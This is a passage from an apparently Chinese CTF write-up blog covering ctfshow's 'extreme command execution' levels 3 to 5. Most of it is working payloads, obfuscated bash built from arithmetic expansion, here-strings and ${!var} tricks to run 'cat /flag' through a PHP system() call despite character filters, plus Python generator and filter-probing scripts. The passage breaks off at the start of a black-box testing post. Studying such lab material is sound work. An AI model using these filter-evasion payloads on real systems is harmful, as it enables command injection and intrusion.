class="line">$\&#x27;\\$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br></pre></td></tr></table></figure><p>这里多出\符号是进行转义使用的。</p><p><img src="../images/image-20230220163149310.png" alt="image-20230220163149310"></p><p>成功输出想要的东西</p><p>/getflag的八进制模式</p><p>但是这里的话是没有进行命令执行，只是进行输出而已。</p><p>这里引入bash的一个语法<code>&lt;&lt;&lt;</code>三个小于号(here-strings)，语法：command [args] &lt;&lt;&lt;[“]$word[“]；$word会展开并作为command的stdin。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">command &lt;&lt;&lt; string</span><br><span class="line">command 是 Shell 命令，string 是字符串。将字符串通过标准输入，传递给命令</span><br><span class="line">这里因为字母被过滤了，bash就用不了了，那么我们就可以使用别的方法进行替代</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">0就是bash的另一个写法</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230220163600991.png" alt="image-20230220163600991"></p><p>那么我们就可以尝试去使用here-strings的方法进行命令执行了</p><p><img src="../images/image-20230220163915706.png" alt="image-20230220163915706"></p><p>输出了1，但是本题用不了，因为题目没有提示在/getflag下。</p><p>所以我们就只能进行<strong>cat /flag</strong>了</p><p>这里的话，$’ xxx ‘执行时不能使用带参的方法的，那么我们要解决这个问题的话就得使用两次<strong>here-strings</strong>的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">（这里是因为bash把这一个字符串当作整体，而没有把空格作为分隔符正确解析）</span><br></pre></td></tr></table></figure><p>修改后的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#a = r&quot;\ 5 7 \ 1 4 7 \ 1 4 5 \ 1 6 4 \ 1 4 6 \ 1 5 4 \ 1 4 1 \ 1 4 7&quot;</span></span><br><span class="line"></span><br><span class="line">a = <span class="string">r&quot;\ 1 4 3 \ 1 4 1 \ 1 6 4 \ 4 0 \ 5 7 \ 1 4 6 \ 1 5 4 \ 1 4 1 \ 1 4 7&quot;</span></span><br><span class="line"></span><br><span class="line">b = a.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    <span class="keyword">if</span> i != <span class="string">&quot;\\&quot;</span>:</span><br><span class="line">        <span class="built_in">str</span> += <span class="string">&quot;$((~$((&quot;</span> + <span class="string">&quot;$((~$(())))&quot;</span> * (<span class="built_in">int</span>(i) + <span class="number">1</span>) + <span class="string">&quot;))))&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">str</span> += <span class="string">&quot;\\\\&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;$\\&#x27;&quot;</span> + <span class="built_in">str</span> + <span class="string">&quot;\\&#x27;&quot;</span>)</span><br></pre></td></tr></table></figure><p>只需要把a进行修改就行了</p><p><strong>payload</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;$\&#x27;\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))))))\\$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br></pre></td></tr></table></figure><p>这里的话特殊点就是在使用第二次<strong>here-strings</strong>的方法的时候，得进行转义处理</p><p><strong>官方wp</strong></p><p><a href="https://ctf-show.feishu.cn/docx/EH72dMi3hoBtLJxDydjcIVcQnSc">https://ctf-show.feishu.cn/docx/EH72dMi3hoBtLJxDydjcIVcQnSc</a>  </p><p>这个使用的是</p><p>禁用了除了<code>01</code>以外的数字，这里需要理解bash对于整数的表示形式是<code>[base#]n</code>的形式，比方说如果一个十进制数4，可以表示为二进制数100，那么在bash里可以表示为<code>2#100</code>。</p><p>所以在现有条件下，我们只要通过位运算<code>$((1&lt;&lt;1))</code>构造出2，就可以通过这种形式来构造任意数字了，比方说<code>ls</code>就是<code>$(($((1&lt;&lt;1))#10011010))     $(($((1&lt;&lt;1))#10100011))</code></p><p><strong>官方payload</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\&#x27;\\$(($((1&lt;&lt;1))#10001111))\\$(($((1&lt;&lt;1))#10001101))\\$(($((1&lt;&lt;1))#10100100))\\$(($((1&lt;&lt;1))#101000))\\$(($((1&lt;&lt;1))#111001))\\$(($((1&lt;&lt;1))#10010010))\\$(($((1&lt;&lt;1))#10011010))\\$(($((1&lt;&lt;1))#10001101))\\$(($((1&lt;&lt;1))#10010011))\&#x27;</span><br></pre></td></tr></table></figure><h2 id="极限命令执行4"><a href="#极限命令执行4" class="headerlink" title="极限命令执行4"></a>极限命令执行4</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//本题灵感来自研究一直没做出来的某赛某题时想到的姿势，太棒啦~。</span></span><br><span class="line"><span class="comment">//flag在根目录flag里</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;check.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><img src="../images/image-20230220165224512.png" alt="image-20230220165224512"></p><p>遇到过滤的会输出??????,那么我们就可以使用一下脚本跑一下哪些东西可以进行利用</p><p><strong>脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里填写自己的靶机网址</span></span><br><span class="line">url = <span class="string">&quot;http://40e404d6-3af3-401c-b11c-9e48298fd1ce.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line">    data = &#123;<span class="string">&#x27;ctf_show&#x27;</span>: <span class="built_in">chr</span>(i)&#125;</span><br><span class="line">    retext = requests.post(url, data=data).text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;??????&quot;</span> <span class="keyword">in</span> retext:</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">str</span> += <span class="built_in">chr</span>(i)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230220165407967.png" alt="image-20230220165407967"></p><p>这里的话比上一题少了个零，但是用上一题的解法的话，可以直接通杀。</p><p><strong>payload</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;$\&#x27;\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))))))\\$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br></pre></td></tr></table></figure><p><strong>官方wp</strong></p><p>就是想办法来构造1</p><p><img src="../images/image-20230220165528116.png" alt="image-20230220165528116"></p><p><code>#</code>是计算字符串长度，两个<code>#</code>中，第一个#是计算字符串长度 第二个#是字符串的名字。$#的值是0，字符串长度为1，所以<code>$</code>是1</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里\$$&#123;#&#125;，虽然输出是$0,但是并不按$0来解析</span><br></pre></td></tr></table></figure><p>还是构造 <strong>cat /flag</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;0$&#123;##&#125;00$&#123;##&#125;00))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;0$&#123;##&#125;000))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;00$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;00$&#123;##&#125;00$&#123;##&#125;0))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;00$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;0))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;000$&#123;##&#125;$&#123;##&#125;0$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;00$&#123;##&#125;00$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br></pre></td></tr></table></figure><p>就是把1替换成$就行了</p><h2 id="极限命令执行5"><a href="#极限命令执行5" class="headerlink" title="极限命令执行5"></a>极限命令执行5</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//本题灵感来自研究一直没做出来的某赛某题时想到的姿势，太棒啦~。</span></span><br><span class="line"><span class="comment">//flag在根目录flag里</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;check.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf_show&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$ctfshow</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>还是先跑一下py脚本，看哪些参数可以进行利用</p><p><img src="../images/image-20230220172921706.png" alt="image-20230220172921706"></p><p>01都得了，这里的话我们可以通过~$()来构造数字，但是0，没了我们就得想八法来构造$0来构造bash了。</p><p>1、是<code>$&#123;!xxx&#125;</code>的用法，举一个很简单的例子：</p><p><img src="../images/image-20230220173724959.png" alt="image-20230220173724959"></p><p>所以其实在这里，只要想办法构造一个变量，变量值是0，就可以很容易的拿到<code>$0</code>了</p><p>其实在出题过程中，使用命令行进行测试，可以通过<code>$&#123;!?&#125;</code>和<code>$&#123;!#&#125;</code>的形式拿到<code>bash</code></p><p>但是很可惜，在php的system环境下没有实现，不然可以做到更极限</p><p><img src="../images/image-20230220173758701.png" alt="image-20230220173758701"></p><p>所以仅能通过定义一个<code>__=$(())</code>的方式将<code>__</code>变量的值设置为0，然后通过<code>$&#123;!__&#125;</code>的形式拿到<code>sh</code>字符。两条命令间通过<code>&amp;&amp;</code>进行连接。至于为什么是两个下划线，是因为bash的变量命名规范是以下划线或者英文字母开头，可以包含下划线和英文字母数字。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$0和$&#123;0&#125;输出的是一个意思</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230220174141641.png" alt="image-20230220174141641"></p><p><img src="../images/image-20230220173839677.png" alt="image-20230220173839677"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里不用<span class="variable">$_</span>的意思是因为<span class="variable">$_</span>有自己的意思，就是记录上一次的值</span><br></pre></td></tr></table></figure><p>2、是<code>~</code>操作，<code>#</code>被禁用，<code>~</code>是按位取反操作，我们可以通过<code>$(())</code>取到0，然后对0进行按位取反，可以得到-1，很多个-1进行排列 可以得到-2、-3、-4、-5、-6、-7、-8，然后再按位取反就可以得到1、2、3、4、5、6、7。（这个操作是web入门57的姿势，有兴趣大家可以去做一下）</p><p><img src="../images/-16768858935023.png" alt="img"></p><p><strong>python脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#a = r&quot;\ 5 7 \ 1 4 7 \ 1 4 5 \ 1 6 4 \ 1 4 6 \ 1 5 4 \ 1 4 1 \ 1 4 7&quot;</span></span><br><span class="line"></span><br><span class="line">a = <span class="string">r&quot;\ 1 4 3 \ 1 4 1 \ 1 6 4 \ 4 0 \ 5 7 \ 1 4 6 \ 1 5 4 \ 1 4 1 \ 1 4 7&quot;</span></span><br><span class="line"></span><br><span class="line">b = a.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    <span class="keyword">if</span> i != <span class="string">&quot;\\&quot;</span>:</span><br><span class="line">        <span class="built_in">str</span> += <span class="string">&quot;$((~$((&quot;</span> + <span class="string">&quot;$((~$(())))&quot;</span> * (<span class="built_in">int</span>(i) + <span class="number">1</span>) + <span class="string">&quot;))))&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">str</span> += <span class="string">&quot;\\\\&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;$\\&#x27;&quot;</span> + <span class="built_in">str</span> + <span class="string">&quot;\\&#x27;&quot;</span>)</span><br></pre></td></tr></table></figure><p>最终payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf_show=__=$(())%26%26$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))))))\\$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))))))\\$((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br></pre></td></tr></table></figure><p>这里有一个新知识，可以通杀</p><p><img src="../images/image-20230220174830458.png" alt="image-20230220174830458"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="variable">$_</span>有自己的意思，就是记录上一次的值,所以加一的话就会输出a下一位的b</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_=(<span class="string">&#x27;@&#x27;</span>^<span class="string">&#x27;!&#x27;</span>); //a</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__=<span class="variable">$_</span>++; //b</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">___=++<span class="variable">$__</span>; //c</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">____=++<span class="variable">$___</span>; //d</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_____=++<span class="variable">$____</span>; //e</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">______=++<span class="variable">$_____</span>; //f</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_______=++<span class="variable">$______</span>; //g</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">________=++<span class="variable">$_______</span>; //h</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_________=++<span class="variable">$________</span>; //i</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__________=++<span class="variable">$_________</span>; //j</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">___________=++<span class="variable">$__________</span>; //k</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">____________=++<span class="variable">$___________</span>; //l</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_____________=++<span class="variable">$____________</span>; //m</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">______________=++<span class="variable">$_____________</span>; //n</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_______________=++<span class="variable">$______________</span>; //o</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">________________=++<span class="variable">$_______________</span>; //p</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_________________=++<span class="variable">$________________</span>; //q</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__________________=++<span class="variable">$_________________</span>; //r</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">___________________=++<span class="variable">$__________________</span>; //s</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">____________________=++<span class="variable">$___________________</span>; //t</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_____________________=++<span class="variable">$____________________</span>; //u</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">______________________=++<span class="variable">$_____________________</span>; //v</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_______________________=++<span class="variable">$______________________</span>; //w</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">________________________=++<span class="variable">$_______________________</span>; //x</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">_________________________=++<span class="variable">$________________________</span>; //y</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">__________________________=++<span class="variable">$_________________________</span>; //z</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow 极限命令执行ji </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-黑盒测试 刷题记录</title>
      <link href="/posts/fed48c7b.html"/>
      <url>/posts/fed48c7b.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.wangan.com/wenda/1860">什么是黑盒测试</a></p><p>这个黑盒测试就是我们不知道是啥考点，得自己去挖掘，然后找到这个是考哪个知识点的</p><h2 id="web380-目录扫描"><a href="#web380-目录扫描" class="headerlink" title="web380(目录扫描)"></a>web380(目录扫描)</h2><p>题目</p><p><img src="../images/image-20230202223826824.png" alt="image-20230202223826824"></p><p>就是这里的话会出现<code>page_1.php</code>    <code>page_2.php</code>  <code>page_3.php</code></p><p>然后我们就得尝试去发现<code>page.php</code>  这就是一种思维发散，毕竟在网站上没看到的话，服务器上不一定没有。   </p><p>难点就在这里</p><p><img src="../images/image-20230202224032610.png" alt="image-20230202224032610"></p><p>出现个$id，我们可以尝试给id传个值看看</p><p><img src="../images/image-20230202224117796.png" alt="image-20230202224117796"></p><p>发现是个文件包含的题目，并且限定了后缀，所以我们就得尝试去查看一下<code>page.php</code>源码</p><p><strong>page.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 